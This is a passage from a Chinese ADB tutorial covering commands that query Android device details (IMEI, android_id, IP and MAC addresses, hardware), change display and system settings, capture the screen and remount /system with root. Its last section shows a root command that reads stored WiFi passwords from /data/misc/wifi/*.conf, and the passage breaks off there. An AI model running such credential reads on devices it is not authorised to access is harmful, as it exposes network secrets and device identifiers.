<p>如果使用命令修改过，那输出可能是：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Physical size: 1080x1920</span><br><span class="line">Override size: 480x1024</span><br></pre></td></tr></table></figure>

<p>表明设备的屏幕分辨率原本是 1080px * 1920px，当前被修改为 480px * 1024px。</p>
<h3 id="屏幕密度"><a href="#屏幕密度" class="headerlink" title="屏幕密度"></a>屏幕密度</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm density</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Physical density: 420</span><br></pre></td></tr></table></figure>

<p>该设备屏幕密度为 420dpi。</p>
<p>如果使用命令修改过，那输出可能是：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Physical density: 480</span><br><span class="line">Override density: 160</span><br></pre></td></tr></table></figure>

<p>表明设备的屏幕密度原来是 480dpi，当前被修改为 160dpi。</p>
<h3 id="显示屏参数"><a href="#显示屏参数" class="headerlink" title="显示屏参数"></a>显示屏参数</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys window displays</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">WINDOW MANAGER DISPLAY CONTENTS (dumpsys window displays)</span><br><span class="line">  Display: mDisplayId=0</span><br><span class="line">    init=1080x1920 420dpi cur=1080x1920 app=1080x1794 rng=1080x1017-1810x1731</span><br><span class="line">    deferred=<span class="literal">false</span> layoutNeeded=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>mDisplayId</code> 为 显示屏编号，<code>init</code> 是初始分辨率和屏幕密度，<code>app</code> 的高度比 <code>init</code> 里的要小，表示屏幕底部有虚拟按键，高度为 1920 - 1794 &#x3D; 126px 合 42dp。</p>
<h3 id="android-id"><a href="#android-id" class="headerlink" title="android_id"></a>android_id</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings get secure android_id</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">51b6be48bac8c569</span><br></pre></td></tr></table></figure>

<h3 id="IMEI"><a href="#IMEI" class="headerlink" title="IMEI"></a>IMEI</h3><p>在 Android 4.4 及以下版本可通过如下命令获取 IMEI：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys iphonesubinfo</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Phone Subscriber Info:</span><br><span class="line">  Phone Type = GSM</span><br><span class="line">  Device ID = 860955027785041</span><br></pre></td></tr></table></figure>

<p>其中的 <code>Device ID</code> 就是 IMEI。</p>
<p>而在 Android 5.0 及以上版本里这个命令输出为空，得通过其它方式获取了（需要 root 权限）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">service call iphonesubinfo 1</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Result: Parcel(</span><br><span class="line">  0x00000000: 00000000 0000000f 00360038 00390030 <span class="string">&#x27;........8.6.0.9.&#x27;</span></span><br><span class="line">  0x00000010: 00350035 00320030 00370037 00350038 <span class="string">&#x27;5.5.0.2.7.7.8.5.&#x27;</span></span><br><span class="line">  0x00000020: 00340030 00000031                   <span class="string">&#x27;0.4.1...        &#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>把里面的有效内容提取出来就是 IMEI 了，比如这里的是 <code>860955027785041</code>。</p>
<p>参考：<a href="http://stackoverflow.com/questions/27002663/adb-shell-dumpsys-iphonesubinfo-not-working-since-android-5-0-lollipop">adb shell dumpsys iphonesubinfo not working since Android 5.0 Lollipop</a></p>
<h3 id="Android-系统版本"><a href="#Android-系统版本" class="headerlink" title="Android 系统版本"></a>Android 系统版本</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.build.version.release</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">5.0.2</span><br></pre></td></tr></table></figure>

<h3 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h3><p>每次想知道设备的 IP 地址的时候都得「设置」-「关于手机」-「状态信息」-「IP地址」很烦对不对？通过 adb 可以方便地查看。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell ifconfig | grep Mask</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">inet addr:10.130.245.230  Mask:255.255.255.252</span><br><span class="line">inet addr:127.0.0.1  Mask:255.0.0.0</span><br></pre></td></tr></table></figure>

<p>那么 <code>10.130.245.230</code> 就是设备 IP 地址。</p>
<p>在有的设备上这个命令没有输出，如果设备连着 WiFi，可以使用如下命令来查看局域网 IP：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell ifconfig wlan0</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wlan0: ip 10.129.160.99 mask 255.255.240.0 flags [up broadcast running multicast]</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wlan0     Link encap:UNSPEC</span><br><span class="line">          inet addr:10.129.168.57  Bcast:10.129.175.255  Mask:255.255.240.0</span><br><span class="line">          inet6 addr: fe80::66cc:2eff:fe68:b6b6/64 Scope: Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:496520 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:68215 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:3000</span><br><span class="line">          RX bytes:116266821 TX bytes:8311736</span><br></pre></td></tr></table></figure>

<p>如果以上命令仍然不能得到期望的信息，那可以试试以下命令（部分系统版本里可用）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell netcfg</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wlan0    UP                               10.129.160.99/20  0x00001043 f8:a9:d0:17:42:4d</span><br><span class="line">lo       UP                                   127.0.0.1/8   0x00000049 00:00:00:00:00:00</span><br><span class="line">p2p0     UP                                     0.0.0.0/0   0x00001003 fa:a9:d0:17:42:4d</span><br><span class="line">sit0     DOWN                                   0.0.0.0/0   0x00000080 00:00:00:00:00:00</span><br><span class="line">rmnet0   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet1   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet3   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet2   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet4   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet6   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet5   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rmnet7   DOWN                                   0.0.0.0/0   0x00000000 00:00:00:00:00:00</span><br><span class="line">rev_rmnet3 DOWN                                   0.0.0.0/0   0x00001002 4e:b7:e4:2e:17:58</span><br><span class="line">rev_rmnet2 DOWN                                   0.0.0.0/0   0x00001002 4e:f0:c8:bf:7a:cf</span><br><span class="line">rev_rmnet4 DOWN                                   0.0.0.0/0   0x00001002 a6:c0:3b:6b:c4:1f</span><br><span class="line">rev_rmnet6 DOWN                                   0.0.0.0/0   0x00001002 66:bb:5d:64:2e:e9</span><br><span class="line">rev_rmnet5 DOWN                                   0.0.0.0/0   0x00001002 0e:1b:eb:b9:23:a0</span><br><span class="line">rev_rmnet7 DOWN                                   0.0.0.0/0   0x00001002 7a:d9:f6:81:40:5a</span><br><span class="line">rev_rmnet8 DOWN                                   0.0.0.0/0   0x00001002 4e:e2:a9:bb:d0:1b</span><br><span class="line">rev_rmnet0 DOWN                                   0.0.0.0/0   0x00001002 fe:65:d0:ca:82:a9</span><br><span class="line">rev_rmnet1 DOWN                                   0.0.0.0/0   0x00001002 da:d8:e8:4f:2e:fe</span><br></pre></td></tr></table></figure>

<p>可以看到网络连接名称、启用状态、IP 地址和 Mac 地址等信息。</p>
<h3 id="Mac-地址"><a href="#Mac-地址" class="headerlink" title="Mac 地址"></a>Mac 地址</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">cat</span> /sys/class/net/wlan0/address</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">f8:a9:d0:17:42:4d</span><br></pre></td></tr></table></figure>

<p>这查看的是局域网 Mac 地址，移动网络或其它连接的信息可以通过前面的小节「IP 地址」里提到的 <code>adb shell netcfg</code> 命令来查看。</p>
<h3 id="CPU-信息"><a href="#CPU-信息" class="headerlink" title="CPU 信息"></a>CPU 信息</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">cat</span> /proc/cpuinfo</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Processor       : ARMv7 Processor rev 0 (v7l)</span><br><span class="line">processor       : 0</span><br><span class="line">BogoMIPS        : 38.40</span><br><span class="line"></span><br><span class="line">processor       : 1</span><br><span class="line">BogoMIPS        : 38.40</span><br><span class="line"></span><br><span class="line">processor       : 2</span><br><span class="line">BogoMIPS        : 38.40</span><br><span class="line"></span><br><span class="line">processor       : 3</span><br><span class="line">BogoMIPS        : 38.40</span><br><span class="line"></span><br><span class="line">Features        : swp half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt</span><br><span class="line">CPU implementer : 0x51</span><br><span class="line">CPU architecture: 7</span><br><span class="line">CPU variant     : 0x2</span><br><span class="line">CPU part        : 0x06f</span><br><span class="line">CPU revision    : 0</span><br><span class="line"></span><br><span class="line">Hardware        : Qualcomm MSM 8974 HAMMERHEAD (Flattened Device Tree)</span><br><span class="line">Revision        : 000b</span><br><span class="line">Serial          : 0000000000000000</span><br></pre></td></tr></table></figure>

<p>这是 Nexus 5 的 CPU 信息，我们从输出里可以看到使用的硬件是 <code>Qualcomm MSM 8974</code>，processor 的编号是 0 到 3，所以它是四核的，采用的架构是 <code>ARMv7 Processor rev 0 (v71)</code>。</p>
<h3 id="内存信息"><a href="#内存信息" class="headerlink" title="内存信息"></a>内存信息</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">cat</span> /proc/meminfo</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MemTotal:        1027424 kB</span><br><span class="line">MemFree:          486564 kB</span><br><span class="line">Buffers:           15224 kB</span><br><span class="line">Cached:            72464 kB</span><br><span class="line">SwapCached:        24152 kB</span><br><span class="line">Active:           110572 kB</span><br><span class="line">Inactive:         259060 kB</span><br><span class="line">Active(anon):      79176 kB</span><br><span class="line">Inactive(anon):   207736 kB</span><br><span class="line">Active(file):      31396 kB</span><br><span class="line">Inactive(file):    51324 kB</span><br><span class="line">Unevictable:        3948 kB</span><br><span class="line">Mlocked:               0 kB</span><br><span class="line">HighTotal:        409600 kB</span><br><span class="line">HighFree:         132612 kB</span><br><span class="line">LowTotal:         617824 kB</span><br><span class="line">LowFree:          353952 kB</span><br><span class="line">SwapTotal:        262140 kB</span><br><span class="line">SwapFree:         207572 kB</span><br><span class="line">Dirty:                 0 kB</span><br><span class="line">Writeback:             0 kB</span><br><span class="line">AnonPages:        265324 kB</span><br><span class="line">Mapped:            47072 kB</span><br><span class="line">Shmem:              1020 kB</span><br><span class="line">Slab:              57372 kB</span><br><span class="line">SReclaimable:       7692 kB</span><br><span class="line">SUnreclaim:        49680 kB</span><br><span class="line">KernelStack:        4512 kB</span><br><span class="line">PageTables:         5912 kB</span><br><span class="line">NFS_Unstable:          0 kB</span><br><span class="line">Bounce:                0 kB</span><br><span class="line">WritebackTmp:          0 kB</span><br><span class="line">CommitLimit:      775852 kB</span><br><span class="line">Committed_AS:   13520632 kB</span><br><span class="line">VmallocTotal:     385024 kB</span><br><span class="line">VmallocUsed:       61004 kB</span><br><span class="line">VmallocChunk:     209668 kB</span><br></pre></td></tr></table></figure>

<p>其中，<code>MemTotal</code> 就是设备的总内存，<code>MemFree</code> 是当前空闲内存。</p>
<h3 id="更多硬件与系统属性"><a href="#更多硬件与系统属性" class="headerlink" title="更多硬件与系统属性"></a>更多硬件与系统属性</h3><p>设备的更多硬件与系统属性可以通过如下命令查看：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">cat</span> /system/build.prop</span><br></pre></td></tr></table></figure>

<p>这会输出很多信息，包括前面几个小节提到的「型号」和「Android 系统版本」等。</p>
<p>输出里还包括一些其它有用的信息，它们也可通过 <code>adb shell getprop &lt;属性名&gt;</code> 命令单独查看，列举一部分属性如下：</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>ro.build.version.sdk</td>
<td>SDK 版本</td>
</tr>
<tr>
<td>ro.build.version.release</td>
<td>Android 系统版本</td>
</tr>
<tr>
<td>ro.build.version.security_patch</td>
<td>Android 安全补丁程序级别</td>
</tr>
<tr>
<td>ro.product.model</td>
<td>型号</td>
</tr>
<tr>
<td>ro.product.brand</td>
<td>品牌</td>
</tr>
<tr>
<td>ro.product.name</td>
<td>设备名</td>
</tr>
<tr>
<td>ro.product.board</td>
<td>处理器型号</td>
</tr>
<tr>
<td>ro.product.cpu.abilist</td>
<td>CPU 支持的 abi 列表[<em>节注一</em>]</td>
</tr>
<tr>
<td>persist.sys.isUsbOtgEnabled</td>
<td>是否支持 OTG</td>
</tr>
<tr>
<td>dalvik.vm.heapsize</td>
<td>每个应用程序的内存上限</td>
</tr>
<tr>
<td>ro.sf.lcd_density</td>
<td>屏幕密度</td>
</tr>
</tbody></table>
<p><em>节注一：</em></p>
<p>一些小厂定制的 ROM 可能修改过 CPU 支持的 abi 列表的属性名，如果用 <code>ro.product.cpu.abilist</code> 属性名查找不到，可以这样试试：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">cat</span> /system/build.prop | grep ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ro.product.cpu.abi=armeabi-v7a</span><br><span class="line">ro.product.cpu.abi2=armeabi</span><br></pre></td></tr></table></figure>

<h2 id="修改设置"><a href="#修改设置" class="headerlink" title="修改设置"></a>修改设置</h2><p><strong>注：</strong> 修改设置之后，运行恢复命令有可能显示仍然不太正常，可以运行 <code>adb reboot</code> 重启设备，或手动重启。</p>
<p>修改设置的原理主要是通过 settings 命令修改 &#x2F;data&#x2F;data&#x2F;com.android.providers.settings&#x2F;databases&#x2F;settings.db 里存放的设置值。</p>
<h3 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm size 480x1024</span><br></pre></td></tr></table></figure>

<p>表示将分辨率修改为 480px * 1024px。</p>
<p>恢复原分辨率命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm size reset</span><br></pre></td></tr></table></figure>

<h3 id="屏幕密度-1"><a href="#屏幕密度-1" class="headerlink" title="屏幕密度"></a>屏幕密度</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm density 160</span><br></pre></td></tr></table></figure>

<p>表示将屏幕密度修改为 160dpi。</p>
<p>恢复原屏幕密度命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm density reset</span><br></pre></td></tr></table></figure>

<h3 id="显示区域"><a href="#显示区域" class="headerlink" title="显示区域"></a>显示区域</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm overscan 0,0,0,200</span><br></pre></td></tr></table></figure>

<p>四个数字分别表示距离左、上、右、下边缘的留白像素，以上命令表示将屏幕底部 200px 留白。</p>
<p>恢复原显示区域命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm overscan reset</span><br></pre></td></tr></table></figure>

<h3 id="关闭-USB-调试模式"><a href="#关闭-USB-调试模式" class="headerlink" title="关闭 USB 调试模式"></a>关闭 USB 调试模式</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global adb_enabled 0</span><br></pre></td></tr></table></figure>

<p>恢复：</p>
<p>用命令恢复不了了，毕竟关闭了 USB 调试 adb 就连接不上 Android 设备了。</p>
<p>去设备上手动恢复吧：「设置」-「开发者选项」-「Android 调试」。</p>
<h3 id="允许-x2F-禁止访问非-SDK-API"><a href="#允许-x2F-禁止访问非-SDK-API" class="headerlink" title="允许&#x2F;禁止访问非 SDK API"></a>允许&#x2F;禁止访问非 SDK API</h3><p>允许访问非 SDK API：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global hidden_api_policy_pre_p_apps 1</span><br><span class="line">adb shell settings put global hidden_api_policy_p_apps 1</span><br></pre></td></tr></table></figure>

<p>禁止访问非 SDK API：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings delete global hidden_api_policy_pre_p_apps</span><br><span class="line">adb shell settings delete global hidden_api_policy_p_apps</span><br></pre></td></tr></table></figure>

<p>不需要设备获得 Root 权限。</p>
<p>命令最后的数字的含义：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>禁止检测非 SDK 接口的调用。该情况下，日志记录功能被禁用，并且令 strict mode API，即 detectNonSdkApiUsage() 无效。不推荐。</td>
</tr>
<tr>
<td>1</td>
<td>仅警告——允许访问所有非 SDK 接口，但保留日志中的警告信息，可继续使用 strick mode API。</td>
</tr>
<tr>
<td>2</td>
<td>禁止调用深灰名单和黑名单中的接口。</td>
</tr>
<tr>
<td>3</td>
<td>禁止调用黑名单中的接口，但允许调用深灰名单中的接口。</td>
</tr>
</tbody></table>
<h3 id="状态栏和导航栏的显示隐藏"><a href="#状态栏和导航栏的显示隐藏" class="headerlink" title="状态栏和导航栏的显示隐藏"></a>状态栏和导航栏的显示隐藏</h3><p>本节所说的相关设置对应 Cyanogenmod 里的「扩展桌面」。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global policy_control &lt;key-values&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;key-values&gt;</code> 可由如下几种键及其对应的值组成，格式为 <code>&lt;key1&gt;=&lt;value1&gt;:&lt;key2&gt;=&lt;value2&gt;</code>。</p>
<table>
<thead>
<tr>
<th>key</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>immersive.full</td>
<td>同时隐藏</td>
</tr>
<tr>
<td>immersive.status</td>
<td>隐藏状态栏</td>
</tr>
<tr>
<td>immersive.navigation</td>
<td>隐藏导航栏</td>
</tr>
<tr>
<td>immersive.preconfirms</td>
<td>?</td>
</tr>
</tbody></table>
<p>这些键对应的值可则如下值用逗号组合：</p>
<table>
<thead>
<tr>
<th>value</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>apps</code></td>
<td>所有应用</td>
</tr>
<tr>
<td><code>*</code></td>
<td>所有界面</td>
</tr>
<tr>
<td><code>packagename</code></td>
<td>指定应用</td>
</tr>
<tr>
<td><code>-packagename</code></td>
<td>排除指定应用</td>
</tr>
</tbody></table>
<p>例如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global policy_control immersive.full=*</span><br></pre></td></tr></table></figure>

<p>表示设置在所有界面下都同时隐藏状态栏和导航栏。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global policy_control immersive.status=com.package1,com.package2:immersive.navigation=apps,-com.package3</span><br></pre></td></tr></table></figure>

<p>表示设置在包名为 <code>com.package1</code> 和 <code>com.package2</code> 的应用里隐藏状态栏，在除了包名为 <code>com.package3</code> 的所有应用里隐藏导航栏。</p>
<h2 id="实用功能"><a href="#实用功能" class="headerlink" title="实用功能"></a>实用功能</h2><h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p>截图保存到电脑：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb exec-out screencap -p &gt; sc.png</span><br></pre></td></tr></table></figure>

<p>如果 adb 版本较老，无法使用 <code>exec-out</code> 命令，这时候建议更新 adb 版本。无法更新的话可以使用以下麻烦点的办法：</p>
<p>先截图保存到设备里：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell screencap -p /sdcard/sc.png</span><br></pre></td></tr></table></figure>

<p>然后将 png 文件导出到电脑：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/sc.png</span><br></pre></td></tr></table></figure>

<p>可以使用 <code>adb shell screencap -h</code> 查看 <code>screencap</code> 命令的帮助信息，下面是两个有意义的参数及含义：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-p</td>
<td>指定保存文件为 png 格式</td>
</tr>
<tr>
<td>-d display-id</td>
<td>指定截图的显示屏编号（有多显示屏的情况下）</td>
</tr>
</tbody></table>
<p>实测如果指定文件名以 <code>.png</code> 结尾时可以省略 -p 参数；否则需要使用 -p 参数。如果不指定文件名，截图文件的内容将直接输出到 stdout。</p>
<p>另外一种一行命令截图并保存到电脑的方法：</p>
<p><em>Linux 和 Windows</em></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell screencap -p | sed <span class="string">&quot;s/\r$//&quot;</span> &gt; sc.png</span><br></pre></td></tr></table></figure>

<p><em>Mac OS X</em></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell screencap -p | gsed <span class="string">&quot;s/\r$//&quot;</span> &gt; sc.png</span><br></pre></td></tr></table></figure>

<p>这个方法需要用到 gnu sed 命令，在 Linux 下直接就有，在 Windows 下 Git 安装目录的 bin 文件夹下也有。如果确实找不到该命令，可以下载 <a href="http://gnuwin32.sourceforge.net/packages/sed.htm">sed for Windows</a> 并将 sed.exe 所在文件夹添加到 PATH 环境变量里。</p>
<p>而在 Mac 下使用系统自带的 sed 命令会报错：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sed: RE error: illegal byte sequence</span><br></pre></td></tr></table></figure>

<p>需要安装 gnu-sed，然后使用 gsed 命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">brew install gnu-sed</span><br></pre></td></tr></table></figure>

<h3 id="录制屏幕"><a href="#录制屏幕" class="headerlink" title="录制屏幕"></a>录制屏幕</h3><p>录制屏幕以 mp4 格式保存到 &#x2F;sdcard：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell screenrecord /sdcard/filename.mp4</span><br></pre></td></tr></table></figure>

<p>需要停止时按 <kbd>Ctrl-C</kbd>，默认录制时间和最长录制时间都是 180 秒。</p>
<p>如果需要导出到电脑：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/filename.mp4</span><br></pre></td></tr></table></figure>

<p>可以使用 <code>adb shell screenrecord --help</code> 查看 <code>screenrecord</code> 命令的帮助信息，下面是常见参数及含义：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>–size WIDTHxHEIGHT</td>
<td>视频的尺寸，比如 <code>1280x720</code>，默认是屏幕分辨率。</td>
</tr>
<tr>
<td>–bit-rate RATE</td>
<td>视频的比特率，默认是 4Mbps。</td>
</tr>
<tr>
<td>–time-limit TIME</td>
<td>录制时长，单位秒。</td>
</tr>
<tr>
<td>–verbose</td>
<td>输出更多信息。</td>
</tr>
</tbody></table>
<h3 id="重新挂载-system-分区为可写"><a href="#重新挂载-system-分区为可写" class="headerlink" title="重新挂载 system 分区为可写"></a>重新挂载 system 分区为可写</h3><p><strong>注：需要 root 权限。</strong></p>
<p>&#x2F;system 分区默认挂载为只读，但有些操作比如给 Android 系统添加命令、删除自带应用等需要对 &#x2F;system 进行写操作，所以需要重新挂载它为可读写。</p>
<p>步骤：</p>
<ol>
<li><p>进入 shell 并切换到 root 用户权限。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看当前分区挂载情况。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rootfs / rootfs ro,relatime 0 0</span><br><span class="line">tmpfs /dev tmpfs rw,seclabel,nosuid,relatime,mode=755 0 0</span><br><span class="line">devpts /dev/pts devpts rw,seclabel,relatime,mode=600 0 0</span><br><span class="line">proc /proc proc rw,relatime 0 0</span><br><span class="line">sysfs /sys sysfs rw,seclabel,relatime 0 0</span><br><span class="line">selinuxfs /sys/fs/selinux selinuxfs rw,relatime 0 0</span><br><span class="line">debugfs /sys/kernel/debug debugfs rw,relatime 0 0</span><br><span class="line">none /var tmpfs rw,seclabel,relatime,mode=770,gid=1000 0 0</span><br><span class="line">none /acct cgroup rw,relatime,cpuacct 0 0</span><br><span class="line">none /sys/fs/cgroup tmpfs rw,seclabel,relatime,mode=750,gid=1000 0 0</span><br><span class="line">none /sys/fs/cgroup/memory cgroup rw,relatime,memory 0 0</span><br><span class="line">tmpfs /mnt/asec tmpfs rw,seclabel,relatime,mode=755,gid=1000 0 0</span><br><span class="line">tmpfs /mnt/obb tmpfs rw,seclabel,relatime,mode=755,gid=1000 0 0</span><br><span class="line">none /dev/memcg cgroup rw,relatime,memory 0 0</span><br><span class="line">none /dev/cpuctl cgroup rw,relatime,cpu 0 0</span><br><span class="line">none /sys/fs/cgroup tmpfs rw,seclabel,relatime,mode=750,gid=1000 0 0</span><br><span class="line">none /sys/fs/cgroup/memory cgroup rw,relatime,memory 0 0</span><br><span class="line">none /sys/fs/cgroup/freezer cgroup rw,relatime,freezer 0 0</span><br><span class="line">/dev/block/platform/msm_sdcc.1/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0</span><br><span class="line">/dev/block/platform/msm_sdcc.1/by-name/userdata /data ext4 rw,seclabel,nosuid,nodev,relatime,noauto_da_alloc,data=ordered 0 0</span><br><span class="line">/dev/block/platform/msm_sdcc.1/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0</span><br><span class="line">/dev/block/platform/msm_sdcc.1/by-name/persist /persist ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0</span><br><span class="line">/dev/block/platform/msm_sdcc.1/by-name/modem /firmware vfat ro,context=u:object_r:firmware_file:s0,relatime,uid=1000,gid=1000,fmask=0337,dmask=0227,codepage=cp437,iocharset=iso8859-1,shortname=lower,errors=remount-ro 0 0</span><br><span class="line">/dev/fuse /mnt/shell/emulated fuse rw,nosuid,nodev,relatime,user_id=1023,group_id=1023,default_permissions,allow_other 0 0</span><br><span class="line">/dev/fuse /mnt/shell/emulated/0 fuse rw,nosuid,nodev,relatime,user_id=1023,group_id=1023,default_permissions,allow_other 0 0</span><br></pre></td></tr></table></figure>

<p>找到其中我们关注的带 &#x2F;system 的那一行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/dev/block/platform/msm_sdcc.1/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新挂载。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mount -o remount,rw -t yaffs2 /dev/block/platform/msm_sdcc.1/by-name/system /system</span><br></pre></td></tr></table></figure>

<p>这里的 <code>/dev/block/platform/msm_sdcc.1/by-name/system</code> 就是我们从上一步的输出里得到的文件路径。</p>
</li>
</ol>
<p>如果输出没有提示错误的话，操作就成功了，可以对 &#x2F;system 下的文件为所欲为了。</p>
<h3 id="查看连接过的-WiFi-密码"><a href="#查看连接过的-WiFi-密码" class="headerlink" title="查看连接过的 WiFi 密码"></a>查看连接过的 WiFi 密码</h3><p><strong>注：需要 root 权限。</strong></p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"><span class="built_in">cat</span> /data/misc/wifi/*.conf</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
